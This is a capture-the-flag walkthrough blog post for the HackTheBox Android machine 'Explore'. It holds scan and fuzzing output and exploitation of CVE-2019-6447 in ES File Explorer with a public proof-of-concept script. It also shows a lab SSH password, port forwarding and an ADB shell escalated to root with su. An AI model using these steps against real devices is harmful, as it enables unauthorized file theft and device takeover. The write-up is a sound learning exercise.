---
layout: post
title: "HTB: EXPLORE (10.10.10.247)"
description: "Explore was an easy Android box that needed a little more enumeration to discover more ports. First I will check out the services running on the ports and discover ESFileExplorer which is vulnerable to CVE-2019-6447. This will allow me to read, list and get files. I will find a an image with credentials to the ssh service. Once logged in via SSH I will check for listening services and discover a hidden service listening on port  5555. I will forward this port to my box and use ADB to connect and gain root shell on the box."
tags: [ctf, hackthebox, android, adb, debug-port, es-file-explorer, CVE-2019-6447, '5555', explore, nmap, port-forwad]
image: "/assets/img/explore/Explore.png"
---
## RECON

### Nmap

`nmap` finds 4 open `TCP` ports and 1 filtered `TCP` port.

```nmap
# Nmap 7.91 scan initiated Wed Oct 27 21:30:45 2021 as: nmap -p- -vvv -oA nmap/allports 10.10.10.247
Increasing send delay for 10.10.10.247 from 0 to 5 due to 1423 out of 4743 dropped probes since last increase.
Nmap scan report for explorer.htb (10.10.10.247)
Host is up, received echo-reply ttl 63 (0.84s latency).
Scanned at 2021-10-27 21:30:45 EDT for 4392s
Not shown: 65530 closed ports
Reason: 65530 resets
PORT      STATE    SERVICE      REASON
2222/tcp  open     EtherNetIP-1 syn-ack ttl 63
5555/tcp  filtered freeciv      no-response
42135/tcp open     unknown      syn-ack ttl 63
44963/tcp open     unknown      syn-ack ttl 63
59777/tcp open     unknown      syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Oct 27 22:43:57 2021 -- 1 IP address (1 host up) scanned in 4392.44 seconds

# Nmap 7.91 scan initiated Thu Oct 28 02:06:42 2021 as: nmap -vvv -p 2222,39963,42135,59777 -A -v -oN nmap/ports 10.10.10.247
Nmap scan report for explorer.htb (10.10.10.247)
Host is up, received echo-reply ttl 63 (0.99s latency).
Scanned at 2021-10-28 02:06:42 EDT for 93s

PORT      STATE  SERVICE REASON         VERSION
2222/tcp  open   ssh     syn-ack ttl 63 (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey:
|   2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqK2WZkEVE0CPTPpWoyDKZkHVrmffyDgcNNVK3PkamKs3M8tyqeFBivz4o8i9Ai8UlrVZ8mztI3qb+cHCdLMDpaO0ghf/50qYVGH4gU5vuVN0tbBJAR67ot4U+7WCcdh4sZHX5NNatyE36wpKj9t7n2XpEmIYda4CEIeUOy2Mm3Es+GD0AAUl8xG4uMYd2rdrJrrO1p15PO97/1ebsTH6SgFz3qjZvSirpom62WmmMbfRvJtNFiNJRydDpJvag2urk16GM9a0buF4h1JCGwMHxpSY05aKQLo8shdb9SxJRa9lMu3g2zgiDAmBCoKjsiPnuyWW+8G7Vz7X6nJC87KpL
39963/tcp closed unknown reset ttl 63
42135/tcp open   http    syn-ack ttl 63 ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
59777/tcp open   http    syn-ack ttl 63 Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
| http-methods:
|_  Supported Methods: OPTIONS
|_http-title: Site doesn't have a title (text/plain).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2222-TCP:V=7.91%I=7%D=10/28%Time=617A3DFA%P=x86_64-pc-linux-gnu%r(N
SF:ULL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=10/28%OT=2222%CT=39963%CU=37150%PV=Y%DS=2%DC=T%G=Y%TM=
OS:617A3E4F%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS
OS:=B)OPS(O1=M54BST11NW6%O2=M54BST11NW6%O3=M54BNNT11NW6%O4=M54BST11NW6%O5=M
OS:54BST11NW6%O6=M54BST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF
OS:FF)ECN(R=Y%DF=Y%T=40%W=FFFF%O=M54BNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
OS:=40%CD=S)

Uptime guess: 0.631 days (since Wed Oct 27 11:00:13 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=253 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Device: phone

TRACEROUTE (using port 39963/tcp)
HOP RTT       ADDRESS
1   883.06 ms 10.10.16.1
2   531.09 ms explorer.htb (10.10.10.247)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 28 02:08:15 2021 -- 1 IP address (1 host up) scanned in 93.64 seconds
```
#### Notes

Lets look at the ports one by one 

- We have ssh running on port 2222 and its banner gives us a clue as to what the box is, [(Banana Studio)](https://www.appbrain.com/dev/Banana+Studio/). Right off the bat I know I will be working with some sort of android box.
- I was unable to identify Port 39963. 
- Port 42135 runs ES File Explorer which is a file manager/explorer.
- Port 59777 runs some type of http site. lets have a look at it.

### Website - TCP 5977
#### Site

The page returns an error message

![Page Returns Error](/assets/img/explore/null.png)

### Directory Brute Force

I will run `fuff` against the site and see what directories we can discover.

```
ffuf -u http://explorer.htb:59777/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 200 -c

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://explorer.htb:59777/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

acct                    [Status: 301, Size: 65, Words: 3, Lines: 1]
bin                     [Status: 301, Size: 63, Words: 3, Lines: 1]
cache                   [Status: 301, Size: 67, Words: 3, Lines: 1]
config                  [Status: 301, Size: 69, Words: 3, Lines: 1]
d                       [Status: 301, Size: 59, Words: 3, Lines: 1]
dev                     [Status: 301, Size: 63, Words: 3, Lines: 1]
data                    [Status: 301, Size: 65, Words: 3, Lines: 1]
etc                     [Status: 301, Size: 63, Words: 3, Lines: 1]
init                    [Status: 403, Size: 31, Words: 4, Lines: 1]
lib                     [Status: 301, Size: 63, Words: 3, Lines: 1]
mnt                     [Status: 301, Size: 63, Words: 3, Lines: 1]
oem                     [Status: 301, Size: 63, Words: 3, Lines: 1]
proc                    [Status: 301, Size: 65, Words: 3, Lines: 1]
product                 [Status: 301, Size: 71, Words: 3, Lines: 1]
sbin                    [Status: 301, Size: 65, Words: 3, Lines: 1]
storage                 [Status: 301, Size: 71, Words: 3, Lines: 1]
sys                     [Status: 301, Size: 63, Words: 3, Lines: 1]
system                  [Status: 301, Size: 69, Words: 3, Lines: 1]
vendor                  [Status: 301, Size: 69, Words: 3, Lines: 1]
:: Progress: [20469/20469] :: Job [1/1] :: 244 req/sec :: Duration: [0:02:34] :: Errors: 78 ::
```
Visiting any of these I get *FORBIDDEN*

![FORBIDDEN](/assets/img/explore/forbidden.png)

At this point I went back online and did a little research. I discovered `port 59777` to be `ESFileExplorer`. Now all these listing made sense. I was staring at the content of `ESFileExplorer` all this time, silly me. I quickly did a search where user data is stored. It could only be two places, `sdcard` or `acct.`

From above listing there is no sdcard. Check if it exists

![SdCard](/assets/img/explore/sdcard.png)

Hmm just to be sure we actually have this directory, lets give it something thats not there and see the results

![something that is not there](/assets/img/explore/somethingthatsnotthere.png)

Bingo! now we are sure sdcard directory is present

Lets `FUZZ` sdcard

```
george㉿kali)-[~/CTF/HTB/boxes/explore]
└─$ ffuf -u http://explorer.htb:59777/sdcard/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 200 -c

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://explorer.htb:59777/sdcard/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

Download                [Status: 301, Size: 87, Words: 3, Lines: 1]
Music                   [Status: 301, Size: 81, Words: 3, Lines: 1]
backups                 [Status: 301, Size: 85, Words: 3, Lines: 1]
android                 [Status: 301, Size: 85, Words: 3, Lines: 1]
download                [Status: 301, Size: 87, Words: 3, Lines: 1]
movies                  [Status: 301, Size: 83, Words: 3, Lines: 1]
music                   [Status: 301, Size: 81, Words: 3, Lines: 1]
notifications           [Status: 301, Size: 97, Words: 3, Lines: 1]
podcasts                [Status: 301, Size: 87, Words: 3, Lines: 1]
pictures                [Status: 301, Size: 87, Words: 3, Lines: 1]
ringtones               [Status: 301, Size: 89, Words: 3, Lines: 1]
:: Progress: [20469/20469] :: Job [1/1] :: 246 req/sec :: Duration: [0:02:42] :: Errors: 189 ::
```

I see a couple interesting directories. FUZZing them one by one will take forever. At this point i go back and do a little research on this vulnerability. I come across this article by [Portswigger](https://portswigger.net/daily-swig/android-file-manager-app-exposing-user-data-through-open-port) which explained the vulnerability and also had a [POC.](https://github.com/fs0c131y/ESFileExplorerOpenPortVuln)

## Shell as kristi
#### CVE-2019-6447

`CVE-2019-6447` is a vulnerability in the ES File Explorer app that allows an attacker to access a lot of information from the system if they are able to connect to the app's port.

Checking the POC we can see some available commands. Lets try them out

![POC](/assets/img/explore/poc.png)

Lets check the `listFiles`
```lua
┌──(george㉿kali)-[~/CTF/HTB/boxes/explore]
└─$ python3 poc.py --cmd listFiles --ip 10.10.10.247
[*] Executing command: listFiles on 10.10.10.247
[*] Server responded with: 200
[
{"name":"lib", "time":"3/25/20 05:12:02 AM", "type":"folder", "size":"12.00 KB (12,288 Bytes)", },
{"name":"vndservice_contexts", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"65.00 Bytes (65 Bytes)", },
{"name":"vendor_service_contexts", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"0.00 Bytes (0 Bytes)", },
{"name":"vendor_seapp_contexts", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"0.00 Bytes (0 Bytes)", },
{"name":"vendor_property_contexts", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"392.00 Bytes (392 Bytes)", },
{"name":"vendor_hwservice_contexts", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"0.00 Bytes (0 Bytes)", },
{"name":"vendor_file_contexts", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"6.92 KB (7,081 Bytes)", },
{"name":"vendor", "time":"3/25/20 12:12:33 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", },
{"name":"ueventd.rc", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"5.00 KB (5,122 Bytes)", },
{"name":"ueventd.android_x86_64.rc", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"464.00 Bytes (464 Bytes)", },
{"name":"system", "time":"3/25/20 12:12:31 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", },
{"name":"sys", "time":"10/27/21 10:55:13 AM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", },
{"name":"storage", "time":"10/27/21 10:55:25 AM", "type":"folder", "size":"80.00 Bytes (80 Bytes)", },
{"name":"sepolicy", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"357.18 KB (365,756 Bytes)", },
{"name":"sdcard", "time":"4/21/21 02:12:29 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", },
{"name":"sbin", "time":"10/27/21 10:55:13 AM", "type":"folder", "size":"140.00 Bytes (140 Bytes)", },
{"name":"product", "time":"3/24/20 11:39:17 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", },
{"name":"proc", "time":"10/27/21 10:55:12 AM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", },
{"name":"plat_service_contexts", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"13.73 KB (14,057 Bytes)", },
{"name":"plat_seapp_contexts", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"1.28 KB (1,315 Bytes)", },
{"name":"plat_property_contexts", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"6.53 KB (6,687 Bytes)", },
{"name":"plat_hwservice_contexts", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"7.04 KB (7,212 Bytes)", },
{"name":"plat_file_contexts", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"23.30 KB (23,863 Bytes)", },
{"name":"oem", "time":"10/27/21 10:55:13 AM", "type":"folder", "size":"40.00 Bytes (40 Bytes)", },
{"name":"odm", "time":"10/27/21 10:55:13 AM", "type":"folder", "size":"220.00 Bytes (220 Bytes)", },
{"name":"mnt", "time":"10/27/21 10:55:14 AM", "type":"folder", "size":"240.00 Bytes (240 Bytes)", },
{"name":"init.zygote64_32.rc", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"875.00 Bytes (875 Bytes)", },
{"name":"init.zygote32.rc", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"511.00 Bytes (511 Bytes)", },
{"name":"init.usb.rc", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"5.51 KB (5,646 Bytes)", },
{"name":"init.usb.configfs.rc", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"7.51 KB (7,690 Bytes)", },
{"name":"init.superuser.rc", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"582.00 Bytes (582 Bytes)", },
{"name":"init.rc", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"29.00 KB (29,697 Bytes)", },
{"name":"init.environ.rc", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"1.04 KB (1,064 Bytes)", },
{"name":"init.android_x86_64.rc", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"3.36 KB (3,439 Bytes)", },
{"name":"init", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"2.29 MB (2,401,264 Bytes)", },
{"name":"fstab.android_x86_64", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"753.00 Bytes (753 Bytes)", },
{"name":"etc", "time":"3/25/20 03:41:52 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", },
{"name":"dev", "time":"10/27/21 10:55:15 AM", "type":"folder", "size":"2.64 KB (2,700 Bytes)", },
{"name":"default.prop", "time":"10/27/21 10:55:13 AM", "type":"file", "size":"1.09 KB (1,118 Bytes)", },
{"name":"data", "time":"3/15/21 04:49:09 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", },
{"name":"d", "time":"10/27/21 10:55:12 AM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", },
{"name":"config", "time":"10/27/21 10:55:14 AM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", },
{"name":"charger", "time":"12/31/69 07:00:00 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", },
{"name":"cache", "time":"10/27/21 10:55:14 AM", "type":"folder", "size":"120.00 Bytes (120 Bytes)", },
{"name":"bugreports", "time":"12/31/69 07:00:00 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", },
{"name":"bin", "time":"3/25/20 12:26:22 AM", "type":"folder", "size":"8.00 KB (8,192 Bytes)", },
{"name":"acct", "time":"10/27/21 10:55:13 AM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }
]
```
And we can read `listFIles`.

### Finding SSh credentials
Enumerting this port further, I find `listPics` command to be most useful
```lua
(george㉿kali)-[~/CTF/HTB/boxes/explore]
└─$ python3 poc.py --cmd listPics --ip 10.10.10.247
[*] Executing command: listPics on 10.10.10.247
[*] Server responded with: 200

{"name":"concept.jpg", "time":"4/21/21 02:38:08 AM", "location":"/storage/emulated/0/DCIM/concept.jpg", "size":"135.33 KB (138,573 Bytes)", },
{"name":"anc.png", "time":"4/21/21 02:37:50 AM", "location":"/storage/emulated/0/DCIM/anc.png", "size":"6.24 KB (6,392 Bytes)", },
{"name":"creds.jpg", "time":"4/21/21 02:38:18 AM", "location":"/storage/emulated/0/DCIM/creds.jpg", "size":"1.14 MB (1,200,401 Bytes)", },
{"name":"224_anc.png", "time":"4/21/21 02:37:21 AM", "location":"/storage/emulated/0/DCIM/224_anc.png", "size":"124.88 KB (127,876 Bytes)"}
```

And right of the bat I stumble upon an interesting image `creds.jpg`. Jumping back to my browser to see if I can read it.

![Creds](/assets/img/explore/creds.png)

Eureka!! we have creds. -ooh kristi, you should really get a password manager.

### SSH
#### Shell

Lets try ssh on port `2222` using `kristi:Kr1sT!5h@Rp3xPl0r3!`

```
┌──(george㉿kali)-[~/CTF/HTB/boxes/explore]
└─$ ssh kristi@10.10.10.247 -p 2222
Password authentication
Password:
:/ $
```
#### User Flag

And we are in. Now lets get user flag.

Digging around I found it in the sdcard directory
```
:/ $ ls sdcard
Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt
Android Download Music  Pictures      Ringtones dianxinos
```
```
:/ $ wc -c sdcard/user.txt
33 sdcard/user.txt
:/ $
```
## Shell as root
### Enumeration

Checking what services are running on the box
```
:/ $ ss -tupln
Netid  State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
udp    UNCONN     0      0      0.0.0.0:49647              0.0.0.0:*
udp    UNCONN     0      0      0.0.0.0:5353               0.0.0.0:*
udp    UNCONN     0      0      [::]:59081              [::]:*
udp    UNCONN     0      0         *:1900                  *:*
udp    UNCONN     0      0         [::ffff:10.10.10.247]:33770                 *:*
udp    UNCONN     0      0      [::]:5353               [::]:*
udp    UNCONN     0      0      [::]:5353               [::]:*
udp    UNCONN     0      0         *:5353                  *:*
tcp    LISTEN     0      50        *:59777                 *:*
tcp    LISTEN     0      50        [::ffff:10.10.10.247]:34661                 *:*
tcp    LISTEN     0      8        [::ffff:127.0.0.1]:44521                 *:*
tcp    LISTEN     0      50        *:2222                  *:*                   users:(("ss",pid=28590,fd=81),("sh",pid=25438,fd=81),("droid.sshserver",pid=3582,fd=81))
tcp    LISTEN     0      4         *:5555                  *:*
tcp    LISTEN     0      10        *:42135                 *:*
```
I see port `5555` open but did not show up on our nmap scans. Lets portfwd it and see what it is.

### Port forward 5555

```
┌──(george㉿kali)-[~/CTF/HTB]
└─$ ssh -L 5555:127.0.0.1:5555 kristi@explorer.htb -p 2222                                                                                                                                                                                                            255 ⨯
Password authentication
Password:
:/ $
```
I could not get a fingerprint right away so I did a little research online on Port 5555 and got a nice [article](https://support.honeywellaidc.com/s/article/How-to-use-adb-over-TCPIP-connect) showing how to connect to it. 

This requires me to install *adb*, sure no problem

### adb
To interact with the debug port 5555, we will need some tools which we can get by installing adb `sudo apt-get install adb`.

To list the current connected device, we will need to connect to the debug port and issue `adb devices`

```bash
──(george㉿kali)-[~/CTF/HTB/boxes/explore]
└─$ adb connect localhost:5555                                                                                                     1 ⨯
connected to localhost:5555

┌──(george㉿kali)-[~/CTF/HTB/boxes/explore]
└─$ adb devices
List of devices attached
localhost:5555  device

┌──(george㉿kali)-[~/CTF/HTB/boxes/explore]
└─$ adb -s localhost:5555 shell
x86_64:/ $
x86_64:/ $ id
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0
x86_64:/ $

```
### I am root

We still have a low privillage connection. by simply running `su` we escalate to `root`

```bash
x86_64:/ $ su
:/ #
:/ # id
uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0
:/ #
```

![Root](/assets/img/explore/root.png)

********* And that was fun!!. Thank you for taking time to read my blog ************
